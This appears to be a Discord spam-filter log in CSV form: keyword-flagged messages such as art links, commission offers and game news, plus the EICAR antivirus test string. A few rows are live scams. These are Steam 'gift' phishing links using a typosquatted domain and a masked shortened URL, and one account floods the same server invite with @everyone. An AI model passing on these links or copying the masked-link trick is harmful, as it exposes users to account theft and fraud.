1279650231062888549,2024-09-01 03:53:09.837000+00:00,1279487886479200326,749443249302929479,1279650231062888549,0,1,['Standard EICARS Test String'],"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
1279704708088467518,2024-09-01 07:29:38.172000+00:00,612550152514961408,440898081303822347,1279704708088467518,2,0,['nitro' -  'free'],"no way, discord gives 1 month nitro for free"
1279893794824650752,2024-09-01 20:00:59.963000+00:00,1279487886479200326,865045690409418773,1279893794824650752,2,0,['https://' -  ' eth'],"Meet Tristan Trémaux, the French defense attorney with cryokinesis! He works at his own law office, Trémaux Law Office. He's one of the many ethereal prowess users (EPs for short). I have more information and art on him here. https://www.verdantbomb.com/tristan"
1280367822425296897,2024-09-03 03:24:36.950000+00:00,1279487886479200326,325011958875029504,1280367822425296897,2,0,['nitro' -  'free'],"Ik, i paid nitro before. Those 2 boosts come as a free bonus"
1281267868146602028,2024-09-05 15:01:04.572000+00:00,1279487886479200326,270995550470406154,1281267868146602028,2,0,['https://' -  'free'],"Normally not the type to read such articles, but I think this is somewhat relevant.\nhttps://www.dexerto.com/tech/discord-lowers-free-upload-limit-to-10mb-storage-management-is-expensive-2887809/"
1281666878112137277,2024-09-06 17:26:35.961000+00:00,1279487886479200326,230089811589857280,1281666878112137277,2,0,['https://' -  'free'],"https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7a878e54-b9fb-4d6b-91c9-833273f86373/dctix9w-63c12c14-e1eb-4c37-9830-f7c94552b65e.png/v1/fill/w_1024,h_576,q_80,strp/feathering_furry_freedom_fighter_s_feet_by_alienvs_dctix9w-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTc2IiwicGF0aCI6IlwvZlwvN2E4NzhlNTQtYjlmYi00ZDZiLTkxYzktODMzMjczZjg2MzczXC9kY3RpeDl3LTYzYzEyYzE0LWUxZWItNGMzNy05ODMwLWY3Yzk0NTUyYjY1ZS5wbmciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.iKaCPvOtGw2JD6ztr_8KOz9mVSFJgDNMhQIMTA7qqJo"
1282386584892604569,2024-09-08 17:06:27.429000+00:00,1054121991365468281,1005229354432864266,1282386584892604569,2,0,['https://' -  'gift'],"Found more birthday gift art for Sebafox of Travis, this one comin' from me and Yeep's bud, cobobalt! ^v^\nhttps://fxtwitter.com/LeSebafox/status/1831863277435154530"
1283080072940621925,2024-09-10 15:02:07.864000+00:00,612550152514961408,465057997190856714,1283080072940621925,2,0,['@everyone' -  'https://'],"https://www.youtube.com/watch?v=r5rnnlgWmlg @everyone I did animation <:ratsniff:933914256318038016>"
1283809748512276491,2024-09-12 15:21:36.077000+00:00,1054121991365468281,1005229354432864266,1283809748512276491,2,0,['https://' -  'gift'],"Gifts for Introvertpooch, happychasm, benjipaws, and PAHKYGO, from good pal Yeep! ^v^\nhttps://fxtwitter.com/WaluigidarkYeep/status/1833964451533606962"
1284029303691935799,2024-09-13 05:54:02.111000+00:00,1279487886479200326,270995550470406154,1284029303691935799,2,0,['https://' -  'free'],"https://fxtwitter.com/Amarebefree_art/status/1834407969376678257/photo/1"
1284142750366961744,2024-09-13 13:24:49.906000+00:00,1054121991365468281,1005229354432864266,1284142750366961744,2,0,['https://' -  'free'],"Jerry Zucker's *Rat Race* is free on YouTube too?! Another W for Paramount and Viacom!\nhttps://youtu.be/_mQmPwu3sdA?si=woU9LIAYwCa_L-Fk"
1284229364463964232,2024-09-13 19:09:00.316000+00:00,1054121991365468281,749443249302929479,1284229364463964232,2,0,['https://' -  'nitro' -  'free'],"https://tenor.com/view/discord-discord-nitro-nitro-free-nitro-free-discord-nitro-gif-19035049"
1287106625722912920,2024-09-21 17:42:12.857000+00:00,1279487886479200326,270422201264504832,1287106625722912920,2,0,['https://' -  'steam'],"https://steamcommunity.com/id/herald11/"
1287568969045119028,2024-09-23 00:19:24.095000+00:00,1054121991365468281,1005229354432864266,1287568969045119028,2,0,['https://' -  'gift'],"Oh look <@966409366108532828>, Yeep made a tickle varient of that birthday gift art he did for you! :D\nhttps://fxtwitter.com/huskishot69/status/1834613236995387465"
1287702209685098506,2024-09-23 09:08:51.139000+00:00,612550152514961408,465057997190856714,1287702209685098506,2,0,['https://' -  'free'],"So remember the AMV I planned for Halloween last year? I discovered another Halloween animation idea jotted down in a .doc file back in 2017-2018-ish that I didn't got a chance to do (seems like I was intimidated by it with the skill level at that time)\nI never drop project so now I debating which one I should do for this year Halloween. I really adore story of the AMV idea I planned for last year, but I also missed the cringe and free (and edgy xD) spirit of 2017 me. So I'll let you guys decide. Don't worry if you choice is not win, I'll do it next year!\nThe polls end when I finished my MAP part for Louixie <:reekrunning:1067345122259378236> so prob in 2 days ish something\n\nYou guys should do the vote on Youtube also cuz I'll most likely check the result there 🗿  https://www.youtube.com/channel/UCM1U8Hr2c4a8mxWosi2MAPw/community?lb=UgkxZ3KVeORv21lOfHE-oLJJe_5WAWL8rFVe"
1288630221305548872,2024-09-25 22:36:26.351000+00:00,1279487886479200326,1226196132271489027,1288630221305548872,2,0,['https://' -  'gift'],"A sweet gift that someone just gave me ^^ Thank you very much, friend. Can you give it a little support? If you want, of course, hahaha\n\nhttps://x.com/Hayate_gl1ch31/status/1839052626660335621?s=19"
1288886202849820733,2024-09-26 15:33:37.107000+00:00,1279487886479200326,230089811589857280,1288886202849820733,2,0,['https://' -  'steam'],"https://steamcommunity.com/sharedfiles/filedetails/?id=3338143872&searchtext="
1290029213922885753,2024-09-29 19:15:32.183000+00:00,612550152514961408,465057997190856714,1290029213922885753,2,0,['https://' -  'steam'],"Random but anyone interested in an animated icon like this https://discord.com/channels/612550152514961408/1227946109645619271/1288871565563400276 for the deluxe version of the new Sonic game? <:Judging:937947265765609503> (they removed Sonic generation on Steam so I had no choice gfdgdhghf)"
1291538977286918164,2024-10-03 23:14:47.819000+00:00,1054121991365468281,1005229354432864266,1291538977286918164,2,0,['https://' -  'free'],"Oh my god, his first movie is free!\nAnd the original voice of Top Cat, Arnold Stang, is in it, too!\nSo that's TWO Arnolds that are the leads of this... thing! XD\nhttps://youtu.be/Ivea-O8sn0k?si=DaFuafgEd0Wejcmi"
1292417833392799785,2024-10-06 09:27:03.443000+00:00,612550152514961408,279021808307404801,1292417833392799785,2,0,['nitro' -  'free'],"I had 1 nitro credit (cause I received nitro from a friend while another was active)\n\nIn order to use the credit, I have to freaking pay for the next month's nitro to then use the credit for free, how dumb is that?"
1292418873592909854,2024-10-06 09:31:11.446000+00:00,612550152514961408,465057997190856714,1292418873592909854,2,0,['gift' -  'nitro'],"I always used gifted nitro and I'm never asked to do so xd"
1292527872560463913,2024-10-06 16:44:18.825000+00:00,612550152514961408,440898081303822347,1292527872560463913,2,0,['gift' -  'nitro'],"u wanna tell me, that discord added button near commands and adding photos just to gift nitro?"
1293166377091203163,2024-10-08 11:01:30.168000+00:00,1054121991365468281,805746093136412672,1293166377091203163,2,0,['https://' -  'gift'],"https://www.deviantart.com/stevenafc11/art/Gift-Art-Loona-and-Diego-Together-1107745914"
1293355656103071848,2024-10-08 23:33:37.801000+00:00,1054121991365468281,695241357991739413,1293355656103071848,2,0,['https://' -  'gift'],"https://www.deviantart.com/dasillymizuart/art/Gift-Linda-Paws-1107169166"
1296893865672052756,2024-10-18 17:53:12.699000+00:00,1054121991365468281,307714247276888074,1296893865672052756,2,0,['https://' -  'steam'],"https://media.discordapp.net/attachments/1286885667342913537/1296679325172629594/SPOILER_kyle_steamles.png?ex=6713d2fa&is=6712817a&hm=dbe870ddaae85d9a9d8ed98442f1b14bad867ad9435d1d20cc8ef32559af89dd&"
1298438685569843280,2024-10-23 00:11:46.464000+00:00,1054121991365468281,695241357991739413,1298438685569843280,2,0,['https://' -  'gift'],"https://www.deviantart.com/mister-fuchs/art/Special-gift-844172535"
1299711842175811615,2024-10-26 12:30:50.653000+00:00,1279487886479200326,190228329511518209,1299711842175811615,2,0,['https://' -  'gift'],"https://vxtwitter.com/Celdwyn/status/1848819166658109720 my bday gift for <@1048773570177798194>  now posted !!"
1300201734932795453,2024-10-27 20:57:30.188000+00:00,1054121991365468281,749443249302929479,1300201734932795453,2,0,['https://' -  'crypto'],"https:// /view/xrd-exrd-crypto-btc-eth-gif-23801255"
1300201865467789342,2024-10-27 20:58:01.310000+00:00,1054121991365468281,749443249302929479,1300201865467789342,2,0,['btc ' -  ' eth'],"btc eth"
1300931278509445182,2024-10-29 21:16:26.931000+00:00,1054121991365468281,703595106120237107,1300931278509445182,2,0,['https://' -  'free'],"Ooooof, Sony fumbled so bad with Concord - investing too much into it, releasing during the oversaturation of Hero Shooters, poor marketing, bad character designs, a $40 price point when the competition is all free to play - and now the entire studio that made it has been shut down! No chance for a revival, Concord is just dead!!!\n\n\nhttps://sonyinteractive.com/en/news/blog/an-update-from-playstation-studios/"
1301592449961164901,2024-10-31 17:03:42.489000+00:00,612550152514961408,465057997190856714,1301592449961164901,2,0,['@everyone' -  'https://'],"@everyone Happy Haboween people :3 👻  🐱 ✨ https://www.youtube.com/watch?v=GwWIGLP8tRg"
1301605653436956774,2024-10-31 17:56:10.443000+00:00,612550152514961408,999735833156390912,1301605653436956774,2,0,['gift' -  'nitro'],"i just got gifted nitro by SomeLolzDude"
1301694763887759400,2024-10-31 23:50:16.030000+00:00,1054121991365468281,695241357991739413,1301694763887759400,2,0,['https://' -  'gift'],"https://www.deviantart.com/dlpeattie/art/Punishment-for-Betrayal-Remake-Gift-1098437558"
1303012217041588367,2024-11-04 15:05:21.339000+00:00,1054121991365468281,189534434616279040,1303012217041588367,2,0,['https://' -  'steam'],"DEVASO Carrying Case for Steam Deck/OLED/ASUS ROG Ally/PlayStation Portal, Upgraded Hard Case with Soft Lining for Console, Controller and Other Accessories, Large Capacity Travel Case https://a.co/d/aK2Gw6D"
1305492811248042065,2024-11-11 11:22:21.085000+00:00,612550152514961408,518464130647064577,1305492811248042065,2,0,['https://' -  'free'],"https://ko-fi.com/orifreejapan/commissions"
1306000153190076466,2024-11-12 20:58:20.830000+00:00,612550152514961408,465057997190856714,1306000153190076466,2,0,['https://' -  'free'],"May I pitch 2 animation memes <:Judging:937947265765609503> feel free to drop the one you see fit to your comm as well\nhttps://www.youtube.com/watch?v=C-2jTYRBBYY\nhttps://www.youtube.com/watch?v=xSrNW-kPKoQ"
1306320834293403768,2024-11-13 18:12:37.163000+00:00,1054121991365468281,189534434616279040,1306320834293403768,2,0,['gift' -  'steam'],"Oh yeah, steam gift time 💀"
1306923991436496936,2024-11-15 10:09:21.032000+00:00,1054121991365468281,695241357991739413,1306923991436496936,2,0,['https://' -  'gift'],"https://www.deviantart.com/anar-celegorm/art/A-gift-for-Benjay-827274535"
1307119070889508985,2024-11-15 23:04:31.598000+00:00,1279487886479200326,1154035289791148103,1307119070889508985,2,0,['https://' -  'steam' -  'free'],"They made Half-Life 2 free to celebrate 20 years since release, also releasing a documentary and a bunch of archived tech demo footage\nhttps://www.youtube.com/watch?v=wU4yPEFXzo0\nhttps://www.youtube.com/watch?v=8CoMdbnJwvE\nhttps://www.youtube.com/watch?v=CaHtOISsLT4\nhttps://www.youtube.com/watch?v=YCjNT9qGjh4\nhttps://store.steampowered.com/app/220/HalfLife_2/"
1307331344631726091,2024-11-16 13:08:01.602000+00:00,1054121991365468281,835222415364718632,1307331344631726091,2,0,['steam' -  'free'],"open steam and get hl2 for free"
1307766754667139202,2024-11-17 17:58:11.444000+00:00,1054121991365468281,381662405513445386,1307766754667139202,2,0,['@everyone' -  'https://'],"@everyone \nTwitch is trying to moderate lgbtq topics. If you talk about them to much you may be banned. Here is a link to a form so you can appose this \nhttps://twitch.uservoice.com/forums/933812-safety/suggestions/49038707-remove-sensitive-social-issues-bullet-point"
1308588247328358455,2024-11-20 00:22:30.557000+00:00,1279487886479200326,1085680531208933396,1308588247328358455,2,0,['https://' -  'free'],"🫷0<0\nHey fellas, Spaceballs is free on Youtube RN. Go watch it if you haven't\nhttps://www.youtube.com/watch?v=vcHfScpSyyM"
1310271568827383979,2024-11-24 15:51:25.677000+00:00,612550152514961408,451302166208970762,1310271568827383979,2,0,['https://' -  'free'],"||https://x.com/Shiverse_/status/1860699897500168299||\n\nMinor Spoilers for Mouthwashing, Please be aware this game has VERY dark themes, so if youre prone to triggers, be careful\n\nHere is a SPOILER-FREE teaser \nthis is my "Final Girl" fanmade arc, inspired by the original Alien :3"
1310805717279703061,2024-11-26 03:13:56.592000+00:00,1279487886479200326,332010020692688897,1310805717279703061,2,0,['https://' -  'gift'],"The start of the Christmas streams.  Holiday specials + art gifts\nhttps://www.picarto.tv/IrkinGIR"
1311150671634104423,2024-11-27 02:04:40.119000+00:00,1054121991365468281,227793202348818432,1311150671634104423,2,0,['https://' -  'gift'],"https://fixvx.com/thegiftedfire/status/1861500160091513201"
1311687819814768731,2024-11-28 13:39:06.225000+00:00,612550152514961408,465057997190856714,1311687819814768731,3,0,['@here' -  'https://' -  'free'],"@here \nYippie, Chrimbus YCH open early for pre-order (Macchiatto tier can get as well) <:eyes_uh:777529527747477564> I'll start working on it in December\nOpening 10 slots for now, I'll see by then if I'm free I can open extra before Christmas 🚶‍♂️\nhttps://ko-fi.com/rikosakari/commissions\n\nThis also apply discounts. If you're Cappucchino (5th) Tier you can put ``Cappucchino`` for 15% off, and if you're Mocha (6th) tier, you can put ``Mocha`` for 40% off <a:ppcatexploded:1184508781812514920>"
1313573256984395858,2024-12-03 18:31:09.476000+00:00,612550152514961408,518464130647064577,1313573256984395858,2,0,['https://' -  'free'],"https://ko-fi.com/orifreejapan/commissions"
1313892863079223337,2024-12-04 15:41:09.507000+00:00,1054121991365468281,1088910287190626344,1313892863079223337,2,0,['gift' -  'nitro'],"If you do I am gifting nitro <:lolbitLOL:1308469968802943038>"
1314243782342086688,2024-12-05 14:55:35.179000+00:00,1279487886479200326,230089811589857280,1314243782342086688,2,0,['https://' -  'steam'],"https://steamcommunity.com/sharedfiles/filedetails/?id=855834326"
1314927498122891335,2024-12-07 12:12:25.724000+00:00,612550152514961408,465057997190856714,1314927498122891335,2,0,['https://' -  'steam'],"https://steamcommunity.com/sharedfiles/filedetails/?id=3257541402&searchtext=push+to+meow"
1315700554466328618,2024-12-09 15:24:16.719000+00:00,612550152514961408,544211397651988503,1315700554466328618,2,0,['https://' -  'gift'],"https://youtu.be/WC0G-SiuPec?si=Al-yWhSpfFPdBxOG\n\nI wanna show off a gift a moof of mine made for me cuz I genuinely feel they're underrated <a:EB_SylveonWag:1038504188981825608>"
1316463673291706379,2024-12-11 17:56:38.425000+00:00,1054121991365468281,969995268403638372,1316463673291706379,3,0,['gift' -  'nitro' -  'free'],"Opening up Source Filmmaker Posters commissions payment can be discord nitro 9.99$ or gift cards the poster size will be 4k, up to 4 models in a single poster, custom lighting if you have any question or interest in commissions feel free to dm ^^\n\nExamples:"
1316469125966467115,2024-12-11 18:18:18.444000+00:00,1054121991365468281,749443249302929479,1316469125966467115,3,0,['gift' -  'nitro' -  'free'],"Opening up Source Filmmaker Posters commissions payment can be discord nitro 9.99$ or gift cards the poster size will be 4k, up to 4 models in a single poster, custom lighting if you have any question or interest in commissions feel free to dm ^^"
1316755415559831583,2024-12-12 13:15:55.202000+00:00,612550152514961408,184950822243663872,1316755415559831583,2,0,['https://' -  'free'],"oops i almost forgor to send my refs <a:waa:1025117449697362021> \ni know my sona is a nightmare to draw so feel free to take any artistic liberties you'd like .w.\nu can also draw them like a slime as in the last pic if you want a challenge x3\ni'm working on a more recent ref but this will have to do for now hfgdfhg\n\nMore refs here: https://drive.google.com/drive/u/0/folders/17n_QMeaE6c1t3kQVNm0Xq99ZSpzen1Cq"
1317579450291978251,2024-12-14 19:50:20.392000+00:00,1054121991365468281,1317171465925165139,1317579450291978251,2,0,['nitro' -  'free'],"Opening up SFM (Source Filmmaker) Posters Commissions ^^\n-Posters will be 4K resolution\n-Up to 4 models in a single poster\n-Have Custom Lighting and Location\n-SFW & NSFW are allowed\nPrice is Discord Nitro if anyone is interested feel free to dm\nExamples of Posters:"
1317674647281602701,2024-12-15 02:08:37.123000+00:00,612550152514961408,883435999093473291,1317674647281602701,2,0,['https://' -  'gift'],"Veosult - Gouged Gift\nhttps://youtu.be/TOXNE2sV8Jg"
1317709521363275827,2024-12-15 04:27:11.752000+00:00,1054121991365468281,1317171465925165139,1317709521363275827,2,0,['https://' -  'free'],"https://fixvx.com/AoiFreesia/status/1867678285917999333"
1317801418744401970,2024-12-15 10:32:21.795000+00:00,612550152514961408,465057997190856714,1317801418744401970,2,0,['https://' -  'free'],"https://bskyx.app/profile/rikosakari.bsky.social/post/3lddmbf6r5s26\n\nBeside drawing what do you do on your free time? - Yes 🗿"
1317858544904568987,2024-12-15 14:19:21.733000+00:00,1054121991365468281,1005229354432864266,1317858544904568987,2,0,['https://' -  'gift'],"https://www.fixdeviantart.com/mightyfilm/art/Beware-of-Geeks-Bearing-Gifts-1131810720"
1318130167796989982,2024-12-16 08:18:41.677000+00:00,612550152514961408,465057997190856714,1318130167796989982,2,0,['https://' -  'free'],"https://discord.gg/sfzJSagz i cant make a one time use link on phone so whatever djdjdnjfs 🚶‍♂️ ig if anyone want to invite someone feel free to use it 🚶‍♂️"
1319604893559820288,2024-12-20 09:58:43.698000+00:00,1054121991365468281,695241357991739413,1319604893559820288,2,0,['https://' -  'gift'],"https://www.deviantart.com/irkingir/art/Christmas-Gift-2024-GagPal-1135720284"
1319705386546368524,2024-12-20 16:38:03.093000+00:00,612550152514961408,749443249302929479,1319705386546368524,2,0,['https://' -  'free'],"if you wanna make a discord bot for funsies, i learned the basics from here\nhttps://www.freecodecamp.org/news/create-a-discord-bot-with-python/"
1320101162422370436,2024-12-21 18:50:43.415000+00:00,612550152514961408,311878466599518219,1320101162422370436,2,0,['steam' -  'free'],"On Steam Is 6.24$, on Epic Games Is Free..."
1320639680848465931,2024-12-23 06:30:36.213000+00:00,1054121991365468281,200478085043191808,1320639680848465931,3,0,['https://' -  'gift' -  'free'],"https://www.fixdeviantart.com/freetzo/art/COM-Gift-Wrapped-Mouz-1137258806"
1321110450305503232,2024-12-24 13:41:16.398000+00:00,612550152514961408,516081936800808961,1321110450305503232,2,0,['gift' -  'steam'],"Santa's gift was a steamroller."
1323545193672347710,2024-12-31 06:56:04.452000+00:00,1054121991365468281,1037712550273490964,1323545193672347710,3,0,['gift' -  'steam' -  'free'],"well, for a head shot i can take 8$\nfor half body 14$ and full body 20$\nshading adds a 5$ since it's nothing special and background could cost as much as detail you want on it, a single pattern or single color is free\nI only can get payed from steam gifts so like if a game was 18 or so i'll take it instead of 20, that can happen too"
1323545586175180931,2024-12-31 06:57:38.032000+00:00,1054121991365468281,1037712550273490964,1323545586175180931,2,0,['steam' -  'free'],"well, for a head shot i can take 8$\nfor half body 14$ and full body 20$\nshading adds a 5$ since it's nothing special and background could cost as much as detail you want on it, a single pattern or single color is free\nI only can get payed from steam so if a game was 18 i'll take it instead of 20, that can happen too"
1324289043529465937,2025-01-02 08:11:52.078000+00:00,612550152514961408,693053938416484402,1324289043529465937,2,0,['https://' -  'nitro'],"My YCH headshot gifs are still open! There only a month nitro so about €9,99\n\nI can do anything! I love experimenting and I’ll find a way, just dm me if ya want one. If you want anything else you can always look at my trello, altough Tahst for full art not just this ych but please do consider checking it out, you might see something you like, or not lol https://trello.com/b/VBPYrqUQ/comission-info"
1324483995085574167,2025-01-02 21:06:32.151000+00:00,1054121991365468281,1317171465925165139,1324483995085574167,2,0,['nitro' -  'free'],"Opening up SFM (Source Filmmaker) Posters Commissions ^^\n-Posters will be 4K resolution\n-Up to 4 models in a single poster\n-Have Custom Lighting and Location\n-SFW & NSFW are allowed\n-Price is Discord Nitro \n- Slots: 2/5\nIf anyone is interested feel free to dm or ping me ^^\nExamples of Posters:"
1325853544863240236,2025-01-06 15:48:38.263000+00:00,1279487886479200326,325011958875029504,1325853544863240236,2,0,['https://' -  'gift'],"https://www.fxdeviantart.com/dasillymizuart/art/Maria-Soles-Gift-1143326150"
1326243916923670578,2025-01-07 17:39:50.215000+00:00,1279487886479200326,1226196132271489027,1326243916923670578,2,0,['https://' -  'free'],"This Is Open! If you are interested, feel free to check it out\n\nhttps://x.com/BrunisDraws/status/1876678266733396215?t=HkUkWOj6xH9kPuY1AQ2__g&s=19"
1327461949344055378,2025-01-11 02:19:51.774000+00:00,1054121991365468281,695241357991739413,1327461949344055378,2,0,['https://' -  'gift'],"https://www.deviantart.com/irkingir/art/Christmas-Gift-2024-Conner-1126623636"
1328177770940989461,2025-01-13 01:44:16.942000+00:00,612550152514961408,932681557729214555,1328177770940989461,2,0,['https://' -  'free'],"I have a "draw this in your style" Challenge going on instagram ! Deadline is on March the day of my bday , Feel free to check it out ♡\n\nhttps://www.instagram.com/p/DC4U5vlJU9d/?igsh=MTB5eHJrc2Y0ZWQ1aw=="
1328328816904503407,2025-01-13 11:44:29.106000+00:00,1054121991365468281,169470767430369281,1328328816904503407,2,0,['https://' -  'free'],"https://media.discordapp.net/attachments/1047636183896834202/1086290072078389268/freeze-2.gif"
1330498142235394109,2025-01-19 11:24:36.569000+00:00,1054121991365468281,125315676775645184,1330498142235394109,2,0,['https://' -  'free'],"https://www.youtube.com/watch?v=LEPZ-drnUKE\nThis song lives rent free in my head for 13 years, you have no idea"
1333507313583128790,2025-01-27 18:41:58.926000+00:00,612550152514961408,896241030800740362,1333507313583128790,3,0,['https://' -  'gift' -  'steam'],"50$ steam gift - https://stemcommunnuty.com/activation/id=156158928574"
1333882567467733053,2025-01-28 19:33:06.424000+00:00,612550152514961408,465057997190856714,1333882567467733053,2,0,['https://' -  'crypto'],"◇Jan-Feb 2025 update◇ Lunar new year update (No ping cuz nothing are majorly changed this month)\n\n- Changed the serber banner\n- Closed the Art fight channels (sadge 😔)\n\n- The Role will be changed majorly based on this month's theme – Lunar new year 2025. Here’s how it has changed:\n```Riko – Dragon without legs\nMods – Snakelets\nMutual – Wind chimes\nSupporters – Red envelopes \nServer boosters - Fireworks\nBots – Lanterns\nEveryone - Dumplings```\n\nServer is opened again, now with a shiny vanity link! (the crypto scam link was so joever so we use vanity link now 💀 ) https://discord.gg/rikoland"
1333930537697673267,2025-01-28 22:43:43.418000+00:00,1054121991365468281,510479212721995777,1333930537697673267,2,0,['https://' -  'free'],"streaming for charity again! feel free to pop by even if you don't donate, but if you do, I may try to do some sketches for yall :3\nhttps://www.twitch.tv/foxbutitsfaux"
1335297780343902259,2025-02-01 17:16:39.467000+00:00,1279487886479200326,1264616737383645394,1335297780343902259,2,0,['https://' -  'steam'],"https://fixupx.com/Baggy_NSFW/status/1885738696407708072\n\nsteamy altz"
1336779979391897651,2025-02-05 19:26:23.258000+00:00,1054121991365468281,749443249302929479,1336779979391897651,2,0,['@everyone' -  'https://'],"@everyone Kinda important annoucement. Due to Twitters lack of moderation and fascist turn recently, from here on out Twitter links have been banned. A rule has been added to the Automod to prevent posting twitter links. Attempting to post a twitter link will not result in a punishment, but it will be blocked from posting.\n \nhttps://fxbsky.app/profile/back2batk.bsky.social/post/3lhh3vzei222q"
1338609617093001277,2025-02-10 20:36:42.879000+00:00,1279487886479200326,1264616737383645394,1338609617093001277,2,0,['https://' -  'steam'],"https://fixupx.com/Baggy_NSFW/status/1889036615214854241\n\nSteamy alts :3"
1339671330265628683,2025-02-13 18:55:35.025000+00:00,612550152514961408,611570950001131539,1339671330265628683,4,0,['@everyone' -  'https://' -  'gift' -  'steam'],"@everyone steam gift 50$ - [steamcommunity.com/gift-card/pay/50](https://u.to/2gbcIQ )"
1339689668698050671,2025-02-13 20:08:27.248000+00:00,612550152514961408,465057997190856714,1339689668698050671,2,0,['https://' -  'free'],"<@&678095569889132546> \nHiya! Decided to open this to public since I'm wrapping up the animation project so I would have more free time in the final week of February! :3\nhttps://ko-fi.com/c/376d7e59e4\n\nAnimation update: I have 4 scenes left les go gamerz 💀 ⚰️"
1340737562590838909,2025-02-16 17:32:24.621000+00:00,1279487886479200326,1264616737383645394,1340737562590838909,2,0,['https://' -  'steam'],"https://fixupx.com/Baggy_NSFW/status/1891178715658227962\n\nSteamy sheep pheets~ >w<"
1341748990705799208,2025-02-19 12:31:27.875000+00:00,1279487886479200326,1270780167597330555,1341748990705799208,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749006836957254,2025-02-19 12:31:31.721000+00:00,1279487886479200326,1270780167597330555,1341749006836957254,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749021743513634,2025-02-19 12:31:35.275000+00:00,1279487886479200326,1270780167597330555,1341749021743513634,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749036725571584,2025-02-19 12:31:38.847000+00:00,1279487886479200326,1270780167597330555,1341749036725571584,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749051804356719,2025-02-19 12:31:42.442000+00:00,1279487886479200326,1270780167597330555,1341749051804356719,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749067138732067,2025-02-19 12:31:46.098000+00:00,1279487886479200326,1270780167597330555,1341749067138732067,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749082976419921,2025-02-19 12:31:49.874000+00:00,1279487886479200326,1270780167597330555,1341749082976419921,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749098050752544,2025-02-19 12:31:53.468000+00:00,1279487886479200326,1270780167597330555,1341749098050752544,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749113389060107,2025-02-19 12:31:57.125000+00:00,1279487886479200326,1270780167597330555,1341749113389060107,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749129243656246,2025-02-19 12:32:00.905000+00:00,1279487886479200326,1270780167597330555,1341749129243656246,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749144179707958,2025-02-19 12:32:04.466000+00:00,1279487886479200326,1270780167597330555,1341749144179707958,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749160302350378,2025-02-19 12:32:08.310000+00:00,1279487886479200326,1270780167597330555,1341749160302350378,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749175401975951,2025-02-19 12:32:11.910000+00:00,1279487886479200326,1270780167597330555,1341749175401975951,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749190727958588,2025-02-19 12:32:15.564000+00:00,1279487886479200326,1270780167597330555,1341749190727958588,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749205810679850,2025-02-19 12:32:19.160000+00:00,1279487886479200326,1270780167597330555,1341749205810679850,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749221375610881,2025-02-19 12:32:22.871000+00:00,1279487886479200326,1270780167597330555,1341749221375610881,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749236361859072,2025-02-19 12:32:26.444000+00:00,1279487886479200326,1270780167597330555,1341749236361859072,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749251268677735,2025-02-19 12:32:29.998000+00:00,1279487886479200326,1270780167597330555,1341749251268677735,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749266338811904,2025-02-19 12:32:33.591000+00:00,1279487886479200326,1270780167597330555,1341749266338811904,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749281328988290,2025-02-19 12:32:37.165000+00:00,1279487886479200326,1270780167597330555,1341749281328988290,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749296965619712,2025-02-19 12:32:40.893000+00:00,1279487886479200326,1270780167597330555,1341749296965619712,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749312438276166,2025-02-19 12:32:44.582000+00:00,1279487886479200326,1270780167597330555,1341749312438276166,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749327504211969,2025-02-19 12:32:48.174000+00:00,1279487886479200326,1270780167597330555,1341749327504211969,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749343191044107,2025-02-19 12:32:51.914000+00:00,1279487886479200326,1270780167597330555,1341749343191044107,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749358538002452,2025-02-19 12:32:55.573000+00:00,1279487886479200326,1270780167597330555,1341749358538002452,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1341749372890648577,2025-02-19 12:32:58.995000+00:00,1279487886479200326,1270780167597330555,1341749372890648577,2,0,['@everyone' -  'https://'],"https://discord.gg/62DAK4Zzxd @everyone"
1342210810675728455,2025-02-20 19:06:34.336000+00:00,612550152514961408,693053938416484402,1342210810675728455,2,0,['https://' -  'steam'],"im steaming ig me aniamtin https://www.youtube.com/live/gPmP0xQP7sQ?si=-_QTuwj4S0KqGzpo"
